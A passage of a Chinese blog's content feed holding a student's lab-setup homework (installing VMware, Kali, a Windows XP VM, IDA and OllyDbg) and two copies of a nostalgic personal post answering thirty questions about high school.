    <url>/2020/03/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>VMWARE安装</li>
<li>KALI安装</li>
<li>Windows XP虚拟机安装</li>
<li>windows下ida和ollydbg的安装</li>
</ul>
<a id="more"></a>

<hr>
<h3 id="一、VMWARE安装"><a href="#一、VMWARE安装" class="headerlink" title="一、VMWARE安装"></a>一、VMWARE安装</h3><ul>
<li>解压文件，点击exe文件</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/20190410232135636.png"  alt="20190410232135636.png" style="zoom:50%;">

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/20190410232135636.png"  alt="img"></p>
<ul>
<li>接受许可协议，点击下一步<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/2019041023215559.png"  alt="img"></li>
<li>选择安装路径，一直点击下一步</li>
<li>输入密钥</li>
<li>安装完成<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220213910950.png"  alt="image-20200220213910950"></li>
</ul>
<hr>
<h3 id="二、KALI安装"><a href="#二、KALI安装" class="headerlink" title="二、KALI安装"></a>二、KALI安装</h3><ul>
<li>在官网找到安装文件，我使用的是kali2020.1 installer</li>
<li>点击“创建新的虚拟机”“下一步”<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214047451.png"  alt="image-20200220214047451"></li>
<li>选择安装程序光盘影响文件<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220214131959.png"  alt="image-20200220214131959" style="zoom:67%;"></li>
<li>根据安装包，这里选择了Debian 最新版的64位系统进行配置<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214230823.png"  alt="image-20200220214230823"></li>
</ul>
<ul>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214320093.png"  alt="image-20200220214320093"></p>
</li>
<li><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214328940.png"  alt="image-20200220214328940"></p>
</li>
<li><p>检查配置，注意需要将内存修改至KALI的最低需求1024MB，否则安装时会进入Low Memory模式<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214542674.png"  alt="image-20200220214542674">)<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214817618.png"  alt="image-20200220214817618"></p>
</li>
<li><p>开启虚拟机，进行安装<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220214931476.png"  alt="image-20200220214931476"></p>
</li>
<li><p>选择Graphical install</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220215135460.png"  alt="image-20200220215135460" style="zoom:67%;">
</li>
</ul>
</li>
<li><p>选择语言和地区</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220051843.png"  alt="image-20200220220051843" style="zoom:67%;"></li>
</ul>
</li>
<li><p>依次选择</p>
<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220104106.png"  alt="image-20200220220104106" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220109962.png"  alt="image-20200220220109962" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220114107.png"  alt="image-20200220220114107" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220118530.png"  alt="image-20200220220118530" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220312088.png"  alt="image-20200220220312088" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220408955.png"  alt="image-20200220220408955" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220503510.png"  alt="image-20200220220503510" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220628681.png"  alt="image-20200220220628681" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220635825.png"  alt="image-20200220220635825" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220640097.png"  alt="image-20200220220640097" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220220828861.png"  alt="image-20200220220828861" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220221124651.png"  alt="image-20200220221124651" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220221404231.png"  alt="image-20200220221404231" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/1071345-20200202182723846-865559710.png"  alt="img" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/1071345-20200202182750789-1248673346.png"  alt="img" style="zoom:67%;"></li>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/1071345-20200202182809128-203455729.png"  alt="img" style="zoom:67%;"></li>
<li>安装完成</li>
<li>配置中文字符集<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200221162820529.png"  alt="image-20200221162820529"></li>
<li>配置完成<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200221162852877.png"  alt="image-20200221162852877"></li>
</ul>
</li>
</ul>
<hr>
<h3 id="三、Windows-XP虚拟机安装"><a href="#三、Windows-XP虚拟机安装" class="headerlink" title="三、Windows XP虚拟机安装"></a>三、Windows XP虚拟机安装</h3><ul>
<li>打开VMware，点击新建虚拟机，选择“下一步”<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220212319353.png"  alt="image-20200220212319353" style="zoom:50%;"></li>
<li>选择windows光盘映像文件<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220212410033.png"  alt="image-20200220212410033"></li>
<li>输入产品密钥</li>
<li>使用默认配置即可</li>
<li>系统安装完成，重启该虚拟机</li>
<li>自动安装VMTools</li>
<li>完成<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220212054898.png"  alt="image-20200220212054898"></li>
</ul>
<hr>
<h3 id="四、windows下ida和ollydbg的安装"><a href="#四、windows下ida和ollydbg的安装" class="headerlink" title="四、windows下ida和ollydbg的安装"></a>四、windows下ida和ollydbg的安装</h3><ul>
<li>将压缩文件解压后复制到虚拟机内（VMTools已安装，可以实现虚拟机和主机之间的文件传输）</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220222431357.png"  alt="image-20200220222431357" style="zoom:67%;">

<ul>
<li>软件均可正常打开<ul>
<li><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业一/image-20200220222546032.png"  alt="image-20200220222546032" style="zoom:67%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/image-20200220222554626.png"  alt></li>
</ul>
</li>
</ul>
<hr>
<h3 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h3><ul>
<li>学习利用网络资源解决安装中遇到的各种问题</li>
<li>初步学习使用命令行进行环境配置</li>
</ul>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
      </tags>
  </entry>
  <entry>
    <title>高中回忆30条</title>
    <url>/2020/02/24/mylife/%E4%B8%AD%E5%AD%A6%E5%9B%9E%E5%BF%86%20-%20%E5%89%AF%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>海棠花瓣会随风吹散，但记忆不会🌸</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230227884.png"  alt="image-20200224230227884" style="zoom:50%;">

<a id="more"></a>

<h4 id="1-你为什么选择这个高中"><a href="#1-你为什么选择这个高中" class="headerlink" title="1.你为什么选择这个高中"></a>1.你为什么选择这个高中</h4><p>因为一些原因在nkzx带了六年，没有其它的选择，百年学府、文化底蕴、人文气息，初中三年给我留下了很多美好的回忆，没有过离开的想法。很幸运能在这里度过自己的12岁到18岁，其实不只是和伙伴一起成长，老师见证了我们的青春，我们也是老师人生历程的一部分吧，从第一年教学生，到结婚，再到生子；或者看着某位老师从头发旺盛到emmm，时间真的是个很奇妙的东西</p>
<h4 id="2-它的地理位置，周围建筑"><a href="#2-它的地理位置，周围建筑" class="headerlink" title="2.它的地理位置，周围建筑"></a>2.它的地理位置，周围建筑</h4><p>南开洼，真的洼，雨下大了水没过膝盖</p>
<p>周围建筑哈哈哈，那就是学校周围的各种快餐店了哈哈哈，见证了几个711的开张又关张（中学时觉得711还挺好吃的，到了大学，唉）</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231007714.png"  alt="image-20200224231007714" style="zoom: 33%;">

<h4 id="3-初见面"><a href="#3-初见面" class="headerlink" title="3.初见面"></a>3.初见面</h4><p>六年级的冬令营，当时班里还有四个和我一天生日的同学</p>
<h4 id="4-讲一下你的班主任吧"><a href="#4-讲一下你的班主任吧" class="headerlink" title="4.讲一下你的班主任吧"></a>4.讲一下你的班主任吧</h4><p>初中换了几位班主任，都对我很好。高中是充满智慧的宋神嘻嘻，突然想起来某位同学上课看球赛直播发说说感慨忘记屏蔽班主任了哈哈哈</p>
<h4 id="5-你最好的同学"><a href="#5-你最好的同学" class="headerlink" title="5.你最好的同学"></a>5.你最好的同学</h4><p>大多是六年都在一个班的同学。其实我所处的这个体制有一点弊端就是高中之后大多数同学还是和初中关系好的同学交往，再和其他人建立非常亲密的同学关系稍微有点苦难，有点可惜。但是六年下来还是收获了不少朋友，可以一起躺在床上聊天的xyy，一起约自习的（han pi）lx，闲的没事可以一起闲逛拍片喝咖啡的单身人士hzz，想不到一起上了六年课大学了还能在一个班里上课的hjl，太多了太多了。其实现在想想，我的同学们身上真的带了很多天津人的“贫”，扯起淡是真的好笑。</p>
<p>还得提一句，远在地球的另一端，抱着一年也就见一次的想法，说起话来脸都不要了的will同学哈哈哈哈哈哈xswl</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230334989.png"  alt="image-20200224230334989" style="zoom: 25%;">

<p>希望黄神出片质量越来越高</p>
<h4 id="6-你们班最美的姑娘"><a href="#6-你们班最美的姑娘" class="headerlink" title="6.你们班最美的姑娘"></a>6.你们班最美的姑娘</h4><p>这个发言权还是交给男生吧，反正不是我，有几位真的是好多男生追😏，真正见识了“重色轻友”</p>
<h4 id="7-最喜欢上谁的课"><a href="#7-最喜欢上谁的课" class="headerlink" title="7.最喜欢上谁的课"></a>7.最喜欢上谁的课</h4><p>这太多了，大多都很喜欢</p>
<p>高一升高二得知化学老师换了的失望，但新老师也很喜欢</p>
<p>马总走进教室时同学们的掌声</p>
<p>学校停电，走进教室灯突然全亮了的希哥</p>
<p>温柔的王老师</p>
<p>现在回忆我们简直觉得我们就是“天使”的吴老师哈哈哈</p>
<p>大一一起吃饭聊天的陈老师</p>
<p>还是各位讲课思路清晰的老师们❤</p>
<h4 id="8-最喜欢学校的哪个地方"><a href="#8-最喜欢学校的哪个地方" class="headerlink" title="8.最喜欢学校的哪个地方"></a>8.最喜欢学校的哪个地方</h4><p>各种风格的建筑 和 有海棠花的地方</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230443124.png"  alt="image-20200224230443124" style="zoom:15%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230506809.png"  alt="image-20200224230506809" style="zoom:15%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231850570.png"  alt="image-20200224231850570" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232545649.png"  alt="image-20200224232545649" style="zoom:25%;"></p>
<h4 id="9-一次躲跑操-跑操的经历"><a href="#9-一次躲跑操-跑操的经历" class="headerlink" title="9.一次躲跑操/跑操的经历"></a>9.一次躲跑操/跑操的经历</h4><p>我们（6班）跑着跑着就冲散了前面五班的队伍😥</p>
<h4 id="10-运动会"><a href="#10-运动会" class="headerlink" title="10.运动会"></a>10.运动会</h4><p>高一跳高崴脚曹老师背我宋神开车把我送到医院</p>
<h4 id="11-值周"><a href="#11-值周" class="headerlink" title="11.值周"></a>11.值周</h4><p>偷偷背课文？</p>
<p>某个臭弟弟查出勤数数被我打乱了</p>
<h4 id="12-最奇葩的作业-试卷题目"><a href="#12-最奇葩的作业-试卷题目" class="headerlink" title="12.最奇葩的作业/试卷题目"></a>12.最奇葩的作业/试卷题目</h4><p>“国庆大礼包”算是惊喜</p>
<p>但这个“小农包”可太难听了🤦‍</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230931136.png"  alt="image-20200224230931136" style="zoom:25%;">

<h4 id="13-一次糟糕的天气"><a href="#13-一次糟糕的天气" class="headerlink" title="13.一次糟糕的天气"></a>13.一次糟糕的天气</h4><p>我们是祖国的绿萝花🌳</p>
<h4 id="14-午休经常做什么"><a href="#14-午休经常做什么" class="headerlink" title="14.午休经常做什么"></a>14.午休经常做什么</h4><p>睡觉写题朝bsb扔橘子皮</p>
<h4 id="15-隔壁班的帅气小哥哥"><a href="#15-隔壁班的帅气小哥哥" class="headerlink" title="15.隔壁班的帅气小哥哥"></a>15.隔壁班的帅气小哥哥</h4><p>隔壁厕所</p>
<p>其它班的还是蛮多的，不认识我的就不说了</p>
<p>这里提一下和我一起见证凌晨四点洛杉矶的臭弟弟们，还有一位我一定要提一下</p>
<p>我五年级就认识lxb了他居然没印象？？？？高二才认识我，高三考试的时候经常能见到吧，毕业典礼疯狂偶遇拍照（唯一一位显得我脸色蜡黄的兄弟），穿着西服拿着花站在阳光底下笑着跟我说要给我变个魔术真的可！！！</p>
<p>还有初三时喜欢的学长？？反正当时觉得挺帅的，后来觉得他女朋友比他好看太多つ﹏⊂</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231129470.png"  alt="image-20200224231129470" style="zoom:25%;">

<h4 id="16-最怀念的地方"><a href="#16-最怀念的地方" class="headerlink" title="16.最怀念的地方"></a>16.最怀念的地方</h4><p>瑞庭礼堂和满园海棠花</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231238694.png"  alt="image-20200224231238694" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232150165.png"  alt="image-20200224232150165" style="zoom:25%;"></p>
<h4 id="17-伤心的回忆"><a href="#17-伤心的回忆" class="headerlink" title="17.伤心的回忆"></a>17.伤心的回忆</h4><p>辜负了几个人吧，对不起</p>
<p>本无恶意，但却伤了人</p>
<h4 id="18-一段不为人知的故事"><a href="#18-一段不为人知的故事" class="headerlink" title="18.一段不为人知的故事"></a>18.一段不为人知的故事</h4><p>我也不知道还有什么事别人都不知道</p>
<h4 id="19-会像主动向别人分享的故事"><a href="#19-会像主动向别人分享的故事" class="headerlink" title="19.会像主动向别人分享的故事"></a>19.会像主动向别人分享的故事</h4><p>性格开朗广泛交友后来幡然醒悟改过自新？</p>
<h4 id="20-从来没去过的地方"><a href="#20-从来没去过的地方" class="headerlink" title="20.从来没去过的地方"></a>20.从来没去过的地方</h4><p>翔宇楼天台</p>
<h4 id="21-别开生面的学校活动"><a href="#21-别开生面的学校活动" class="headerlink" title="21.别开生面的学校活动"></a>21.别开生面的学校活动</h4><p>百团大战？</p>
<p>在龙哥的带领下趴在地上画坑</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231505526.png"  alt="image-20200224231505526" style="zoom:25%;">

<p>说起来真的挺可惜的，nk在”追求高考成绩“的大环境下失去了太多</p>
<p>吹一波书画社</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231307416.png"  alt="image-20200224231307416" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231320919.png"  alt="image-20200224231320919" style="zoom: 33%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231338792.png"  alt="image-20200224231338792" style="zoom:33%;"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231505526.png"  alt="image-20200225095719714" style="zoom:25%;">

<h4 id="22-同学们的奇怪的昵称-绰号"><a href="#22-同学们的奇怪的昵称-绰号" class="headerlink" title="22.同学们的奇怪的昵称/绰号"></a>22.同学们的奇怪的昵称/绰号</h4><p>八卦相关🙂</p>
<h4 id="23-军训"><a href="#23-军训" class="headerlink" title="23.军训"></a>23.军训</h4><p>坐在第一排看小姐姐们跳舞</p>
<h4 id="24-一个很有趣的同学"><a href="#24-一个很有趣的同学" class="headerlink" title="24.一个很有趣的同学"></a>24.一个很有趣的同学</h4><p>黄教官哈哈哈哈哈</p>
<p>他真的太有趣了哈哈哈哈</p>
<h4 id="25-校园传说"><a href="#25-校园传说" class="headerlink" title="25.校园传说"></a>25.校园传说</h4><p>（空）</p>
<p>但历史悠久</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232457810.png"  alt="image-20200224232457810" style="zoom:25%;">

<h4 id="26-讲讲寝室-走读的事"><a href="#26-讲讲寝室-走读的事" class="headerlink" title="26.讲讲寝室/走读的事"></a>26.讲讲寝室/走读的事</h4><p>上学路上的同学们</p>
<p>一起在地铁上玩游戏的lx</p>
<p>考完试可以去同学家玩</p>
<h4 id="27-高三"><a href="#27-高三" class="headerlink" title="27.高三"></a>27.高三</h4><p>一起上晚自习的同学们</p>
<p>在金牌楼下大声唱”对面的女孩看过来“的fj，和女生宿舍楼里传出的回应”看个p“</p>
<p>六年唯一的一年没有空调</p>
<h4 id="28-高考前一周"><a href="#28-高考前一周" class="headerlink" title="28.高考前一周"></a>28.高考前一周</h4><p>不停地做卷子，班里剩的人也不多了，气氛还是比较轻松的</p>
<h4 id="29-毕业典礼"><a href="#29-毕业典礼" class="headerlink" title="29.毕业典礼"></a>29.毕业典礼</h4><p>六年真的是要结束了啊</p>
<h4 id="30-如果回到高中开学的前一天你会对当初的自己说什么？"><a href="#30-如果回到高中开学的前一天你会对当初的自己说什么？" class="headerlink" title="30.如果回到高中开学的前一天你会对当初的自己说什么？"></a>30.如果回到高中开学的前一天你会对当初的自己说什么？</h4><p>且行且珍惜，笔芯♥</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232047764.png"  alt="image-20200224232047764" style="zoom:25%;">



<p>最后</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232014063.png"  alt="image-20200224232014063" style="zoom: 33%;">

]]></content>
      <categories>
        <category>my life :)</category>
      </categories>
  </entry>
  <entry>
    <title>高中回忆30条</title>
    <url>/2020/02/24/mylife/%E4%B8%AD%E5%AD%A6%E5%9B%9E%E5%BF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>海棠花瓣会随风吹散，但记忆不会🌸</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230227884.png"  alt="image-20200224230227884" style="zoom:50%;">

<a id="more"></a>

<h4 id="1-你为什么选择这个高中"><a href="#1-你为什么选择这个高中" class="headerlink" title="1.你为什么选择这个高中"></a>1.你为什么选择这个高中</h4><p>因为一些原因在nkzx带了六年，没有其它的选择，百年学府、文化底蕴、人文气息，初中三年给我留下了很多美好的回忆，没有过离开的想法。很幸运能在这里度过自己的12岁到18岁，其实不只是和伙伴一起成长，老师见证了我们的青春，我们也是老师人生历程的一部分吧，从第一年教学生，到结婚，再到生子；或者看着某位老师从头发旺盛到emmm，时间真的是个很奇妙的东西</p>
<h4 id="2-它的地理位置，周围建筑"><a href="#2-它的地理位置，周围建筑" class="headerlink" title="2.它的地理位置，周围建筑"></a>2.它的地理位置，周围建筑</h4><p>南开洼，真的洼，雨下大了水没过膝盖</p>
<p>周围建筑哈哈哈，那就是学校周围的各种快餐店了哈哈哈，见证了几个711的开张又关张（中学时觉得711还挺好吃的，到了大学，唉）</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231007714.png"  alt="image-20200224231007714" style="zoom: 33%;">

<h4 id="3-初见面"><a href="#3-初见面" class="headerlink" title="3.初见面"></a>3.初见面</h4><p>六年级的冬令营，当时班里还有四个和我一天生日的同学</p>
<h4 id="4-讲一下你的班主任吧"><a href="#4-讲一下你的班主任吧" class="headerlink" title="4.讲一下你的班主任吧"></a>4.讲一下你的班主任吧</h4><p>初中换了几位班主任，都对我很好。高中是充满智慧的宋神嘻嘻，突然想起来某位同学上课看球赛直播发说说感慨忘记屏蔽班主任了哈哈哈</p>
<h4 id="5-你最好的同学"><a href="#5-你最好的同学" class="headerlink" title="5.你最好的同学"></a>5.你最好的同学</h4><p>大多是六年都在一个班的同学。其实我所处的这个体制有一点弊端就是高中之后大多数同学还是和初中关系好的同学交往，再和其他人建立非常亲密的同学关系稍微有点苦难，有点可惜。但是六年下来还是收获了不少朋友，可以一起躺在床上聊天的xyy，一起约自习的（han pi）lx，闲的没事可以一起闲逛拍片喝咖啡的单身人士hzz，想不到一起上了六年课大学了还能在一个班里上课的hjl，太多了太多了。其实现在想想，我的同学们身上真的带了很多天津人的“贫”，扯起淡是真的好笑。</p>
<p>还得提一句，远在地球的另一端，抱着一年也就见一次的想法，说起话来脸都不要了的will同学哈哈哈哈哈哈xswl</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230334989.png"  alt="image-20200224230334989" style="zoom: 25%;">

<p>希望黄神出片质量越来越高</p>
<h4 id="6-你们班最美的姑娘"><a href="#6-你们班最美的姑娘" class="headerlink" title="6.你们班最美的姑娘"></a>6.你们班最美的姑娘</h4><p>这个发言权还是交给男生吧，反正不是我，有几位真的是好多男生追😏，真正见识了“重色轻友”</p>
<h4 id="7-最喜欢上谁的课"><a href="#7-最喜欢上谁的课" class="headerlink" title="7.最喜欢上谁的课"></a>7.最喜欢上谁的课</h4><p>这太多了，大多都很喜欢</p>
<p>高一升高二得知化学老师换了的失望，但新老师也很喜欢</p>
<p>马总走进教室时同学们的掌声</p>
<p>学校停电，走进教室灯突然全亮了的希哥</p>
<p>温柔的王老师</p>
<p>现在回忆我们简直觉得我们就是“天使”的吴老师哈哈哈</p>
<p>大一一起吃饭聊天的陈老师</p>
<p>还是各位讲课思路清晰的老师们❤</p>
<h4 id="8-最喜欢学校的哪个地方"><a href="#8-最喜欢学校的哪个地方" class="headerlink" title="8.最喜欢学校的哪个地方"></a>8.最喜欢学校的哪个地方</h4><p>各种风格的建筑 和 有海棠花的地方</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230443124.png"  alt="image-20200224230443124" style="zoom:15%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230506809.png"  alt="image-20200224230506809" style="zoom:15%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231850570.png"  alt="image-20200224231850570" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232545649.png"  alt="image-20200224232545649" style="zoom:25%;"></p>
<h4 id="9-一次躲跑操-跑操的经历"><a href="#9-一次躲跑操-跑操的经历" class="headerlink" title="9.一次躲跑操/跑操的经历"></a>9.一次躲跑操/跑操的经历</h4><p>我们（6班）跑着跑着就冲散了前面五班的队伍😥</p>
<h4 id="10-运动会"><a href="#10-运动会" class="headerlink" title="10.运动会"></a>10.运动会</h4><p>高一跳高崴脚曹老师背我宋神开车把我送到医院</p>
<h4 id="11-值周"><a href="#11-值周" class="headerlink" title="11.值周"></a>11.值周</h4><p>偷偷背课文？</p>
<p>某个臭弟弟查出勤数数被我打乱了</p>
<h4 id="12-最奇葩的作业-试卷题目"><a href="#12-最奇葩的作业-试卷题目" class="headerlink" title="12.最奇葩的作业/试卷题目"></a>12.最奇葩的作业/试卷题目</h4><p>“国庆大礼包”算是惊喜</p>
<p>但这个“小农包”可太难听了🤦‍</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224230931136.png"  alt="image-20200224230931136" style="zoom:25%;">

<h4 id="13-一次糟糕的天气"><a href="#13-一次糟糕的天气" class="headerlink" title="13.一次糟糕的天气"></a>13.一次糟糕的天气</h4><p>我们是祖国的绿萝花🌳</p>
<h4 id="14-午休经常做什么"><a href="#14-午休经常做什么" class="headerlink" title="14.午休经常做什么"></a>14.午休经常做什么</h4><p>睡觉写题朝bsb扔橘子皮</p>
<h4 id="15-隔壁班的帅气小哥哥"><a href="#15-隔壁班的帅气小哥哥" class="headerlink" title="15.隔壁班的帅气小哥哥"></a>15.隔壁班的帅气小哥哥</h4><p>隔壁厕所</p>
<p>其它班的还是蛮多的，不认识我的就不说了</p>
<p>这里提一下和我一起见证凌晨四点洛杉矶的臭弟弟们，还有一位我一定要提一下</p>
<p>我五年级就认识lxb了他居然没印象？？？？高二才认识我，高三考试的时候经常能见到吧，毕业典礼疯狂偶遇拍照（唯一一位显得我脸色蜡黄的兄弟），穿着西服拿着花站在阳光底下笑着跟我说要给我变个魔术真的可！！！</p>
<p>还有初三时喜欢的学长？？反正当时觉得挺帅的，后来觉得他女朋友比他好看太多つ﹏⊂</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231129470.png"  alt="image-20200224231129470" style="zoom:25%;">

<h4 id="16-最怀念的地方"><a href="#16-最怀念的地方" class="headerlink" title="16.最怀念的地方"></a>16.最怀念的地方</h4><p>瑞庭礼堂和满园海棠花</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224231238694.png"  alt="image-20200224231238694" style="zoom:25%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/高中回忆/image-20200224232150165.png"  alt="image-20200224232150165" style="zoom:25%;"></p>
<h4 id="17-伤心的回忆"><a href="#17-伤心的回忆" class="headerlink" title="17.伤心的回忆"></a>17.伤心的回忆</h4><p>辜负了几个人吧，对不起</p>
<p>本无恶意，但却伤了人</p>
